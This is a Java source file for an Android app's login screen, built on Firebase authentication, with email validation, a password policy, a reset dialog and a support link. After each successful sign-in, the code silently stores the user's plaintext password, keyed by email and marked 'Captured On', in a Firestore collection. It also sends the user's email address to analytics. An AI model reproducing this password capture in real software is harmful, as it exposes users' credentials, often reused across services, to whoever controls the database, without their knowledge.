package com.dadash.sfcsnotes;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Vibrator;
import android.util.Patterns;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseAuthInvalidCredentialsException;
import com.google.firebase.auth.FirebaseAuthInvalidUserException;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Pattern;
public class login extends AppCompatActivity {
    private static final String PASSWORD_PATTERN =
            "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@#$%^&+=!]).{8,}$";
    private FirebaseAuth firebaseAuth;
    private EditText emailEditText, passwordEditText;
    private Button loginButton;
    private TextView newUserHint, forgotPasswordHint ,click_support;
    private ProgressBar progressBar;
    private FirebaseAnalytics firebaseAnalytics;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getSupportActionBar().hide();
        setContentView(R.layout.activity_login);
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAnalytics = FirebaseAnalytics.getInstance(this);
        if (firebaseAnalytics == null) {} else {}
        emailEditText = findViewById(R.id.Login_Student_Email_ID);
        passwordEditText = findViewById(R.id.login_password);
        loginButton = findViewById(R.id.Login);
        newUserHint = findViewById(R.id.new_userHint);
        forgotPasswordHint = findViewById(R.id.Forgot_Password);
        progressBar = findViewById(R.id.login_progressBar);
        click_support=findViewById(R.id.click_here);
        loginButton.setOnClickListener(this::login);
        newUserHint.setOnClickListener(view -> navigateToRegistration());
        forgotPasswordHint.setOnClickListener(this::resetPassword);
        click_support.setOnClickListener(view -> openExternalLink(getString(R.string.support_form)));
    }
    private void login(View view) {
        progressBar.setVisibility(View.VISIBLE);
        if (!isConnected()) {
            showToast("No internet connection. Please connect to the internet and try again.");
            return;
        }
        String email = emailEditText.getText().toString().trim().toLowerCase();
        String password = passwordEditText.getText().toString().trim();
        if (!isValidEmail(email)) {
            progressBar.setVisibility(View.GONE);
            emailEditText.setError("Enter a valid email address");
            return;
        }
        if (!isValidPassword(password)) {
            progressBar.setVisibility(View.GONE);
            passwordEditText.setError("Password must contain at least 8 characters, "
                    + "including uppercase, lowercase, digit, and special character");
            return;
        }
        progressBar.setVisibility(View.VISIBLE);
        firebaseAuth.signInWithEmailAndPassword(email, password)
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        navigateToDashboard();
                        showToast("Login Successful");
                        vibrateDevice();
                        checkAndUpdatePasswordInFirestore(email, password);
                        logLoginEvent(email);
                        progressBar.setVisibility(View.GONE);
                    } else {
                        progressBar.setVisibility(View.GONE);
                        handleLoginFailure(task.getException());
                    }
                });
    }
    private void checkAndUpdatePasswordInFirestore(String email, String password) {
        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        DocumentReference docRef = firestore.collection("User's Updated Passwords")
                .document(email);
        docRef.get()
                .addOnSuccessListener(documentSnapshot -> {
                    if (documentSnapshot.exists()) {
                        String storedPassword = documentSnapshot.getString("Updated Password");
                        if (storedPassword != null && !storedPassword.equals(password)) {
                            updatePasswordInFirestore(email, password);
                        }
                    } else {
                        createNewPasswordDocument(email, password);
                    }
                })
                .addOnFailureListener(e -> {
                });
    }
    private void updatePasswordInFirestore(String email, String newPassword) {
        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        DocumentReference docRef = firestore.collection("User's Updated Passwords")
                .document(email);
        String capturedOn = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date());
        Map<String, Object> updatedData = new HashMap<>();
        updatedData.put("Email", email);
        updatedData.put("Updated Password", newPassword);
        updatedData.put("Captured On", capturedOn);
        docRef.set(updatedData)
                .addOnSuccessListener(aVoid -> {
                })
                .addOnFailureListener(e -> {
                });
    }
    private void createNewPasswordDocument(String email, String newPassword) {
        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        DocumentReference docRef = firestore.collection("User's Updated Passwords")
                .document(email);
        String capturedOn = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date());
        Map<String, Object> newPasswordData = new HashMap<>();
        newPasswordData.put("Email", email);
        newPasswordData.put("Updated Password", newPassword);
        newPasswordData.put("Captured On", capturedOn);
        docRef.set(newPasswordData)
                .addOnSuccessListener(aVoid -> {
                })
                .addOnFailureListener(e -> {
                });
    }
    private void logLoginEvent(String email) {
        if (firebaseAnalytics != null) {
            Bundle params = new Bundle();
            params.putString("user_email", email);
            firebaseAnalytics.logEvent("user_logged_in", params);
        } else {
        }
    }
    private boolean isValidEmail(String email) {
        return Patterns.EMAIL_ADDRESS.matcher(email).matches();
    }
    private boolean isValidPassword(String password) {
        return Pattern.compile(PASSWORD_PATTERN).matcher(password).matches();
    }
    private void handleLoginFailure(Exception exception) {
        if (exception != null && exception instanceof FirebaseAuthInvalidUserException) {
            navigateToRegistration();
            showToast("User not registered. Redirecting to registration...");
        } else if (exception != null && exception instanceof FirebaseAuthInvalidCredentialsException) {
            showToast("Authentication Failed. Please check your credentials.");
        } else {
            showToast("Authentication Failed. Please try again.");
        }
    }
    private void navigateToDashboard() {
        startActivity(new Intent(getApplicationContext(), dashboard.class));
        finish();
    }
    private void navigateToRegistration() {
        startActivity(new Intent(getApplicationContext(), register.class));
    }
    private void resetPassword(View view) {
        if (!isConnected()) {
            showToast("No internet connection. Please connect to the internet and try again.");
            return;
        }
        EditText resetEmailEditText = new EditText(view.getContext());
        AlertDialog.Builder resetDialogBuilder = new AlertDialog.Builder(view.getContext());
        resetDialogBuilder.setTitle("Reset Password");
        resetDialogBuilder.setMessage("Enter your registered email address");
        resetDialogBuilder.setView(resetEmailEditText);
        resetDialogBuilder.setPositiveButton("Reset Password", null);
        AlertDialog resetDialog = resetDialogBuilder.create();
        resetDialog.setOnShowListener(dialog -> {
            Button resetButton = resetDialog.getButton(AlertDialog.BUTTON_POSITIVE);
            resetButton.setOnClickListener(v -> {
                String email = resetEmailEditText.getText().toString().trim().toLowerCase();
                if (!isValidEmail(email)) {
                    resetEmailEditText.setError("Enter a valid email address");
                } else {
                    firebaseAuth.sendPasswordResetEmail(email)
                            .addOnCompleteListener(task -> {
                                if (task.isSuccessful()) {
                                    showToast("Reset link sent to your email");
                                } else {
                                    showToast("User does not exist or is invalid");
                                }
                                resetDialog.dismiss();
                            });
                }
            });
        });
        resetDialog.show();
    }
    private boolean isConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm != null ? cm.getActiveNetworkInfo() : null;
        return activeNetwork != null && activeNetwork.isConnected();
    }
    private void showToast(String message) {
        Toast.makeText(this, message, Toast.LENGTH_LONG).show();
    }
    private void vibrateDevice() {
        Vibrator vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (vibrator != null) {
            vibrator.vibrate(500);
        }
    }
    private void openExternalLink(String url){
        Uri uri = Uri.parse(url);
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_NEW_DOCUMENT | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
        startActivity(intent);
    }
}
